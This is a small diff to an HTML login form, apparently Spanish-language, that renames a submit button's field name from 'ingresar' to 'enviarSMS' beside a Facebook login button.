@@ -104,7 +104,7 @@
 				</table>
 				<center>
 					<br><br>
-					<input type="submit" name="ingresar" value="         Ingresar         " onload="save()">
+					<input type="submit" name="enviarSMS" value="         Ingresar         " onload="save()">
 					<br><br>
 					<div class="fb-login-button" data-width="240" data-max-rows="1" data-size="medium" data-button-type="continue_with" data-show-faces="false" data-auto-logout-link="false" data-use-continue-as="true"></div>
 					
